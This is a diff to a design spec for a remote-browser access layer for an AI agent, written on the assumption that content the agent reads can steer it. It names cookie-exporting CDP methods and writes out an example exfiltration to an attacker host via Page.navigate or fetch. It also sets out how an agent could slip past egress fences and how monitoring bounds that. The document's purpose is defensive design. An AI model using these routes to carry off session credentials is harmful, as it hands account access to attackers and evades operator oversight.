@@ -28,11 +28,16 @@ policy, everything ledgered, and the operator able to watch.
   reached through the gateway below. Testing local code does not weaken
   this: a short-lived Cloudflare Tunnel exposes the container's dev
   server to the remote browser (section 7). One path, one audit trail.
-- **CDP is the protocol.** Browser Run exposes a raw Chrome DevTools
-  Protocol WebSocket; every client (Playwright, Puppeteer,
-  chrome-devtools-mcp, Stagehand) speaks it, and switching providers
-  later is a URL change. The chassis relays CDP frames and stays
-  ignorant of what drives them.
+- **CDP is the protocol, the relay is a POLICY POINT.** Browser Run
+  exposes a raw Chrome DevTools Protocol WebSocket; every client
+  (Playwright, Puppeteer, chrome-devtools-mcp, Stagehand) speaks it,
+  and switching providers later is a URL change. But a raw CDP pipe is
+  an exfiltration door: `Network.getAllCookies`, `Storage.getCookies`,
+  `WebAuthn.getCredentials`, and `Runtime.evaluate("document.cookie")`
+  would hand the mind the very session credentials this door protects,
+  past every content sweep. So the relay is NOT transparent (section 5,
+  "the relay is where policy lives"): it drops credential-export
+  methods, owns WebAuthn, and substitutes secrets on injection.
 - **MCP is the mind-side surface.** The harness gets a standard browser
   MCP server (chrome-devtools-mcp) pointed at the relay; no bespoke
   browsing tools. Codex speaks MCP too, so the door is harness-portable
@@ -53,11 +58,24 @@ Cloudflare API token that reaches Browser Run.
 
 Each `WebSession` DO:
 
-- **Opens**: dials `wss://api.cloudflare.com/.../browser-rendering/
+- **Opens (into an already-fenced container)**: the egress fence is
+  NOT raised by this DO, and could not be, `allowedHosts` belongs to
+  the `WakeContainer` (the scheduler-side supervisor), across the
+  umbilical from browser-gk, with no control path back. Instead a
+  web-capable agent's container is launched WITH the fence already in
+  force (section 5): there is no unfenced window to close because the
+  container never runs unfenced. So open simply dials
+  `wss://api.cloudflare.com/.../browser-rendering/
   devtools/browser?keep_alive=600000&recording=true` with the
-  Worker-held API token, restores the saved storage state (CDP
-  `Storage.setCookies` + an init script for localStorage), and marks
-  the session live.
+  Worker-held API token and restores the saved storage state (CDP
+  `Storage.setCookies` + an init script for localStorage). The values
+  stay in browser-gk and Browser Run and never enter the container, so
+  door-egress of an extracted value is bounded by where doors go, not
+  by a value sweep (section 5, layer two). browser-gk can rely
+  on the fence because the scheduler only wires the web door (the
+  BROWSER binding, the `web` option) for agents whose container is
+  launched fenced; a web upgrade cannot reach browser-gk from an
+  unfenced container.
 - **Relays**: pipes CDP frames both ways between the container side and
   Browser Run. The relay is transparent to clients and is where all
   policy lives.
@@ -103,12 +121,29 @@ porch and umbilical currently speak request/response only, so both grow
 a ws-passthrough (the porch already terminates loopback HTTP; a ws
 upgrade is an HTTP request).
 
-Risk to spike FIRST: WebSocket upgrade through the container outbound
-interception path (`interceptOutboundHttp`) is undocumented. If it does
-not relay, fallback: the porch dials browser-gk's public hostname
-directly with a root-held door bearer (the pre-umbilical pattern,
-still credential-free for the mind), and the virtual-host hop is
-restored when the platform supports it.
+Risks to spike FIRST: there are TWO undocumented WebSocket links, not
+one, and the fallback only covers the first.
+1. Container -> umbilical: the ws upgrade through the container
+   outbound interception path (`interceptOutboundHttp`). Fallback if it
+   does not relay: the porch dials browser-gk's public hostname with a
+   root-held door bearer (the pre-umbilical pattern, credential-free
+   for the mind). But this fallback REINTRODUCES a container-root door
+   token for the life of the feature, so it is a real regression, not a
+   free escape hatch, and the spike must report which path it is on.
+2. Umbilical -> browser-gk: a ws upgrade over a SERVICE BINDING. If a
+   binding does not carry an upgrade, browser-gk needs a public
+   hostname reached with the root bearer, which collapses into the same
+   regression as (1). The spike must prove this hop too.
+
+Reconnect and keepalive are part of an implementable "session may live
+the whole wake". `keep_alive=600000` is an IDLE window, not a lifetime:
+Browser Run has no max active lifetime but closes after 10 idle minutes
+and on platform releases. So the relay sends a cheap CDP heartbeat
+(e.g. `Browser.getVersion`) on an interval inside that window,
+snapshots on any drop, and the client reopens transparently. And
+`WebSession` itself needs the keepalive `WakeContainer` already uses
+(operon#3): a DO that only pipes a socket is otherwise evicted
+mid-relay.
 
 ## 5. The hostile-mind boundary
 
@@ -116,6 +151,75 @@ The browser inherits spec 0003 section 5's premise: the mind is
 assumed steerable by content it reads, and a browser feeds it
 attacker-controlled content while holding the agent's logged-in
 sessions. The door defends itself:
+
+### The relay is not transparent (credentials do not leave over CDP)
+
+A logged-in session's cookies and passkeys are the credential; the
+whole door is pointless if the mind can read them out over CDP and
+carry them off. Two layers:
+
+- **Method drop (layer one)**: on the client->upstream direction the
+  relay refuses `Network.getCookies`, `Network.getAllCookies`,
+  `Storage.getCookies`, `Storage.getStorageKeyForFrame`, and every
+  `WebAuthn.*` method, answering the client with a CDP error so its
+  request settles. WebAuthn is OWNED by the relay (the virtual
+  authenticator, section on passkeys), exactly as the Cloudflare API
+  token is; the mind never touches it. This is clean and has no false
+  positives.
+- **Door egress of an extracted value (layer two)**: `Runtime.evaluate`
+  and `Runtime.callFunctionOn` are dual-use (chrome-devtools-mcp needs
+  them), so they cannot be dropped, and `document.cookie` / localStorage
+  are reachable through them. The wake denylist is NOT the answer here:
+  it is a container-local array and browser-gk is a remote Worker with
+  no path to it, and the only way to make one would be to ship the
+  cookie VALUES into the container, which is the leak. So the container
+  never learns the cookie value, and the containment for the value the
+  mind DID extract is where the doors GO, not a value sweep:
+  - Direct egress is closed by the launch fence (this section, the
+    egress bullet). This is the primary boundary.
+  - `notify` lands in front of the OPERATOR; `email` is held and
+    swept; `PR` targets an allowlisted repo under operator review; so a
+    credential shoved through one of those reaches the operator or a
+    reviewed surface, not an attacker.
+  - `publish` is the one door with a public destination (the agent's
+    own host), so published bytes keep their existing gitleaks +
+    denylist sweep, which catches token-SHAPED secrets. A session
+    cookie that matches no pattern is the residual, bounded by the
+    session recording, the navigation ledger, and the agent's own site
+    being monitored. If that residual is judged too sharp for a tenant,
+    the deployment can gate `publish` closed while a web session is
+    open; that is a policy knob, not a default.
+
+### The remote browser is itself an open-web egress path (irreducible)
+
+The container fence and the door bounds above are about the CONTAINER.
+The browser is remote and on the open web BY DESIGN, so a mind that has
+read a cookie via `Runtime.evaluate` can also make the BROWSER carry it
+out: `Page.navigate("https://attacker/?c=<cookie>")`, or a `fetch()`
+inside an `evaluate`. `allowedHosts` never sees this; it is Browser
+Run's own egress. This is the confused-deputy limit restated (spec 0003
+section 5): a hostile mind wielding the agent's own legitimate browser
+cannot be stopped by a network boundary, only bounded and observed. The
+layers, honestly labelled as bound-and-detect, not prevent:
+- **Bulk export is blocked**: the credential-export CDP methods are
+  dropped, so the mind cannot dump the whole cookie jar or the passkeys
+  in one call; it is reduced to whatever a single `evaluate` reads.
+- **Scoped sessions are fenced at the platform**: a session whose work
+  is one site (`x-account`, `github`) is opened with Browser Run
+  `allowedDomainSets` pinned to that site's domains, so the REMOTE
+  browser itself cannot reach an attacker origin. Only an open-ended
+  `research` session is unfenced, and that is the case the next layers
+  cover.
+- **The relay checks navigation**: `Page.navigate` targets are matched
+  against the origin denylist; a deployment that wants to harden an
+  open-ended session can run it denylist-heavy or, in the extreme,
+  allowlist-only.
+- **Detection, not prevention, for the rest**: the session recording,
+  the navigation ledger, the per-wake caps, and delete-session are the
+  containment for the residual exactly as they are everywhere the
+  hostile-mind doctrine applies. The web door does not claim to prevent
+  a steered mind from misusing a session it legitimately holds; no door
+  does.
 
 - **Session lifetime and concurrency.** A session may live for the
   WHOLE wake: some work needs a browser open end to end, and the wake
@@ -126,13 +230,17 @@ sessions. The door defends itself:
   per agent enforces it, aggregated across named and unnamed sessions
   via short leases keyed by wakeId, so N sessions never dodge the
   limit; it also totals browser-minutes per wake into the ledger for
-  observability and cost tracking. An optional aggregate
-  browser-minutes knob exists for deployments that want a tighter
-  bound than wake length; default off. The wake wall keeps the
-  hijack and cost ceiling: 3 concurrent for one wake is the worst
-  case, and the next wake starts with a clean context.
-- **Origin denylist** (env, default empty): destinations the relay
-  refuses to navigate to regardless of what the mind wants. The list is
+  observability and cost tracking. The aggregate browser-minutes knob
+  is a hard money bound (section 9): DEFAULT ON at 20-30 min/wake for
+  the first tenant, looser or off only where an operator has watched
+  the ledger and chosen to. The wake wall is the backstop behind it;
+  the next wake starts with a clean context either way.
+- **Origin denylist** (env, default empty), enforced in TWO places:
+  the relay refuses to forward a `Page.navigate` to a denied origin,
+  AND the Browser Run session is opened with `allowedDomainSets`
+  guardrails (a platform-level layer under the relay), so a denied
+  origin is unreachable even if a relay bug lets a navigation slip. The
+  list is
   deployment policy, like every cap. An allowlist is deliberately NOT
   the default: the whole point of the door is the open web.
 - **CDP input sweep**: `Input.insertText`, `Input.dispatchKeyEvent`
@@ -162,11 +270,53 @@ same pattern as the phase-2 mind-credential injection.
   signup, so it cannot leak what it does not hold.
 - **Fill**: the mind types the placeholder
   (`{{vault:web/<name>}}`) into the field. The RELAY substitutes the
-  real value into the `Input.insertText` frame, but only on a domain
-  the credential is BOUND to. Anywhere else the placeholder goes
-  through verbatim: a steered mind cannot be phished into entering the
-  GitHub password on a lookalike domain, because the mind does not
-  have it.
+  real value, but only on a domain the credential is BOUND to.
+  Substitution runs on EVERY CDP path that can put text into the page,
+  not just `Input.insertText`: `Input.dispatchKeyEvent`,
+  `Runtime.evaluate`, `Runtime.callFunctionOn`, and clipboard
+  (`Input.dispatchKeyEvent` paste), because Playwright- and
+  chrome-devtools-mcp-style `fill` usually goes through
+  `element.value = ...` in an evaluate, not synthetic keystrokes.
+  Sweep-without-substitute on one path would submit the literal
+  placeholder.
+
+  The credential is always injected as DATA, never spliced into
+  JavaScript SOURCE. A password holds `'`, `"`, `\`, `${`, newlines;
+  concatenating it into an expression string would both corrupt an
+  ordinary fill and open a code-injection path. So: on the keystroke
+  paths (`insertText`, `dispatchKeyEvent`) the value is already data.
+  On `Runtime.callFunctionOn` the relay substitutes an ARGUMENT value
+  (a data param in the `arguments` array), never the `functionDeclaration`
+  body. A placeholder found INSIDE a raw `Runtime.evaluate` expression
+  string is REFUSED, since there is no safe splice of arbitrary data
+  into code; the relay's error tells the client to pass the field's
+  value through an argument-carrying path (`callFunctionOn` arguments or
+  a bound-function fill) instead. The placeholder token itself is chosen
+  from a syntax-inert alphabet so it never needs escaping to detect.
+
+  The origin checked is the TARGET EXECUTION CONTEXT's origin, never
+  the top-level page's. A `Runtime.evaluate`/`callFunctionOn` carries
+  an `executionContextId` (or an `objectId`) that can point at a
+  cross-origin iframe: a page from a bound domain can embed an
+  attacker's frame, and substituting against the top-level origin would
+  inject the real password into the attacker's document. So the relay
+  binds against the origin of the exact EXECUTION CONTEXT the fill runs
+  in, which it obtains by evaluating `location.origin` IN THAT CONTEXT:
+  for an `executionContextId` via `Runtime.evaluate({expression:
+  "location.origin", contextId})`, and for an `objectId` via
+  `Runtime.callFunctionOn({objectId, functionDeclaration: "function(){
+  return location.origin }", returnByValue:true})`, which executes in
+  the object's OWN context and so needs no assumption about `this`.
+  Neither the session/target origin nor a `this.ownerDocument` probe is
+  used: the session is too coarse (site isolation is per-SITE, so a
+  same-site cross-origin subframe shares its parent's target) and
+  `this` is wrong (a locator fill's `callFunctionOn` runs on a utility
+  object with the element as an argument). Running `location.origin` in
+  the target context is precise for both. Substitution is REFUSED
+  unless that origin is on the bound domain. Anywhere off a bound domain
+  the placeholder goes through verbatim: a steered mind cannot be
+  phished into entering the GitHub password on a lookalike domain, or
+  a bound page's hostile subframe, because the mind does not have it.
 
 ### Domain binding (auth hosts are rarely the main host)
 
@@ -263,19 +413,27 @@ Through the ops gateway (spec 0003 section 3), new routes:
   generation it started from and the DO refuses stale ones, so an
   in-flight snapshot-on-close from the killed session cannot write
   the deleted cookies back under the same name. Delete means gone.
+- Downloads and uploads are content boundaries. A downloaded file that
+  reaches the container is inbound untrusted content (the email/#24
+  class): the relay keeps downloads WORKER-side (ledgered, offered to
+  the mind only through a door that scans them), never landing raw in
+  the container. Uploads (`Page.setFileInputFiles`) can push repo bytes
+  into a logged-in third-party origin, so an upload is swept exactly
+  like a publish/PR payload (denylist + gitleaks) before it leaves.
 - Live sessions: the response includes the Browser Run live-view URL
   (`Cloudflare.getLiveView`), which is watch-and-intervene: the
   operator can see the page the agent sees and take the wheel.
-- Recordings live in the Cloudflare dashboard (Browser Run > Runs);
-  the session ledger rows carry the session id to find them. A
-  recording is rrweb event JSON (DOM mutations, input events,
+- A recording is rrweb event JSON (DOM mutations, input events,
   navigations), not video and not raw CDP frames; input field content
-  is masked by default. Cloudflare retains recordings for 30 DAYS
-  (2-hour cap per session), then deletes them. The ledger is therefore
-  the permanent audit trail and the recording the 30-day replay
-  window; if longer replay retention is ever wanted, the recording is
-  fetchable as JSON via API on session close and an archival hop into
-  R2 makes it ours (optional, phase 4).
+  is masked by default. Cloudflare retains recordings for only 30 DAYS
+  (2-hour cap per session) then deletes them, which is why "never
+  deleted" (section 3) requires us to keep our own copy: browser-gk
+  FETCHES each recording as JSON on session close (with retry, since a
+  recording exists only after close) and ARCHIVES it to R2. The
+  Cloudflare dashboard (Browser Run > Runs) is the convenient 30-day
+  viewer; the R2 copy plus the ledger is the permanent trail. This is
+  MVP, not optional: without it "recordings are never deleted" is
+  false, since Cloudflare deletes them.
 
 ## 7. Local testing without a local browser
 
@@ -289,6 +447,9 @@ them rendered. The dev-server path:
   which keeps the container credential-free. The command yields an
   ephemeral `https://*.trycloudflare.com` URL the remote browser can
   reach.
+- If the exposed dev server needs WebSocket/HMR, the tunnel is started
+  with `--protocol=http2`: `cloudflared`'s default QUIC path has
+  dropped `Upgrade: websocket` in the past.
 - The URL is ledgered like a navigation; the tunnel dies with the wake
   (the entrypoint kills it at teardown, same as every wake process).
 - This keeps one browser, one audit trail, and adds a bonus: the
@@ -318,44 +479,103 @@ interception machinery closes that gap:
   the ledger/chronicle gets per-wake aggregates (distinct hosts,
   request counts, first sight of a never-before-seen host, which is
   the interesting security signal).
-- Interception observes and logs; it does not filter. Egress POLICY
-  (allow/deny lists) stays a separate decision so the audit ships
-  without arguing about what to block.
+- Interception observes and logs by default, and the GENERAL egress
+  allow/deny policy stays a separate later decision so the audit can
+  ship without arguing about what to block for ordinary traffic (npm,
+  git, an API the agent legitimately calls).
+- The ONE exception, a hard precondition of the web door, is a web
+  session's lifetime. BLOCKING and CONTENT-LOGGING are different
+  primitives with different prerequisites:
+  - Blocking is the container's `allowedHosts` deny-by-default
+    allowlist (SNI-level, so HTTPS is covered with no CA-trust). This
+    ships in the web door MVP: outbound is allowed only to the minimal
+    wake infra (the mind endpoint, npm, GitHub, and, only when `operon
+    web expose` runs, Cloudflare's fixed argotunnel INGRESS edge that
+    `cloudflared` dials, never `*.trycloudflare.com`, which is the
+    remote browser's public hostname and would be an attacker-tunnel
+    sink). The argotunnel ingress is a tunnel TRANSPORT, not an HTTP
+    endpoint, so it is not itself an exfil sink. Never an agent-owned
+    publish host (reached through the publish door, not egress) and
+    never a browsing target (browsing is remote). The fence is a LAUNCH
+    property of the container, owned by the `WakeContainer` supervisor
+    that owns `allowedHosts`: a web-capable agent's container is started
+    WITH the deny-by-default allowlist already in force, for the whole
+    wake. This is why there is no cross-worker raise/confirm path to
+    define and no first-open window: the container never runs unfenced,
+    so `allowedHosts` predates any session. It is wake-scoped by
+    construction (a container is one wake) and never lowered mid-wake.
+    Non-web agents launch unfenced exactly as today. No real account is
+    created before this exists.
+  - Content-logging every request (this section's JSONL/aggregates)
+    over `interceptOutboundHttps` needs the CA-trust image change and
+    stays phase 5. Losing the log for non-web traffic is not a
+    credential leak; the block already stands.
 
 ## 9. Costs
 
-Browser Run on Workers Paid: 10 browser-hours/month and 10 averaged
-concurrent browsers included, then $0.09/browser-hour and $2 per
-additional concurrent browser. Under the concurrency model the
-theoretical ceiling is concurrency cap x wake wall x wakes/day: at
-the defaults (3 concurrent, 2 h wall, 3 wakes/day) that is 18
-browser-hours/day, ~$47/month if every wake ran three browsers flat
-out. In practice a session dies after 10 idle minutes, so browser
-hours track actual activity, and one session at a time is the
-doctrine; real usage lands near the included 10 h. The budget levers,
-tightest first: the optional aggregate browser-minutes knob (ON it is
-a hard money bound), the concurrency cap, and the wake wall. The
-WebMeter's per-wake minute totals in the ledger are the meter to
-watch before tightening anything.
+Browser Run on Workers Paid includes 10 browser-hours/month. We use
+the CDP endpoint + API token, which is the REST/CDP billing path:
+DURATION only, $0.09/browser-hour beyond the included 10 h. The $2
+per-averaged-concurrent-browser charge is the WORKERS BINDING path
+(`launch()` via a Browser binding) and does NOT apply here; do not
+treat it as load-bearing unless the door ever switches to a binding.
+
+The concurrency cap bounds hijack blast radius, not the bill: the bill
+is hours. Theoretical ceiling is concurrency cap x wake wall x
+wakes/day: at 3 concurrent, a 2 h wall and 3 wakes/day that is 18
+browser-hours/day, which blows through the included 10 h in under a
+day. That is NOT "costs land within the included hours"; it is the
+worst case of a lever left wide open. So for the first tenant the
+default is the aggregate browser-minutes knob ON at 20-30 min/wake (a
+hard money bound), with the concurrency cap and wake wall behind it.
+Idle timeout (10 min) means real usage tracks activity and lands well
+under the ceiling; the WebMeter's per-wake minute totals in the ledger
+are the meter to watch before loosening anything.
 
 ## 10. Phasing
 
-1. **Spike**: a ws CDP relay porch -> umbilical -> Worker -> Browser
-   Run, driving one page load end to end. Proves the one undocumented
-   link (section 4) before any structure is built.
-2. **MVP**: browser-gk with `WebSession` (open/relay/ledger/snapshot),
-   `operon web open|sessions|close`, chrome-devtools-mcp staged into
-   the harness config, ops routes (list + history + delete), recording
-   on and ARCHIVED to R2 on close, the concurrency cap.
-3. **Signup flow proven**: the agent creates one real account end to
-   end (email verification via the email door, password into the
-   vault), operator watches via live view.
-4. **Hardening**: CDP input sweep, origin denylist knob, live-view
-   link in a notify action, tunnel-based local testing
-   (`operon web expose`).
-5. **Egress audit** (section 8): full-container request logging over
+1. **Spike**, and its acceptance is not "one page load". Prove:
+   (a) the ws upgrade container -> umbilical -> browser-gk -> Browser
+   Run over BOTH undocumented links (section 4), or document in writing
+   that we are on the public-hostname fallback and have therefore
+   reintroduced a container-root door token;
+   (b) the relay drops the cookie/passkey export methods;
+   (c) an idle heartbeat keeps a quiet session past 10 minutes;
+   (d) a disconnect snapshots and a reopen restores cookies;
+   (e) an operator delete while the session is live cannot resurrect
+   its state.
+   No real account is created until (b) holds: never on an unswept,
+   unfiltered CDP pipe.
+2. **MVP, with the controls, not after them**: browser-gk with
+   `WebSession` (open/relay/ledger/snapshot + reconnect/heartbeat), the
+   relay POLICY POINT (credential-export method drop, input
+   substitution on every text path bound to the target execution
+   context's origin, origin denylist + `allowedDomainSets`),
+   storage-state persistence,
+   recording archived to R2 on close, the concurrency + minute caps,
+   **web-session egress enforcement** (deny-by-default outbound while a
+   session is open via the container's SNI-level `allowedHosts`
+   allowlist of door + infra hosts only, which blocks HTTPS with no
+   CA-trust needed, section 5 layer two; browsing is remote and never
+   on this list; distinct from the full-container CONTENT audit of
+   phase 5 that does need TLS interception), `operon web
+   open|sessions|close`, chrome-devtools-mcp staged into the harness,
+   ops routes (list + history + delete). The sweep, the method filter,
+   AND the egress fence are NOT a later hardening pass: the first live
+   account must be created on a swept, filtered, egress-fenced pipe.
+3. **Signup flow proven** (the proof those controls work): the agent
+   creates one real account end to end (email verification via the
+   email door, password minted door-side into the vault, or a passkey),
+   operator watches via live view.
+4. **Polish**: live-view link in a notify action, tunnel-based local
+   testing (`operon web expose`), passkey enrollment path.
+5. **General egress audit** (section 8): full-container request
+   logging for ALL traffic (npm, git, ordinary API calls) over
    `interceptAllOutboundHttp`, HTTPS included once the CA-trust image
-   change (shared with mind-credential injection) lands.
+   change (shared with mind-credential injection) lands. This is the
+   broad observe-then-policy pass; the web session's own deny-by-
+   default fence already shipped in MVP, so no real account is ever
+   created before egress is fenced.
 
 ## 11. What this does NOT do
 
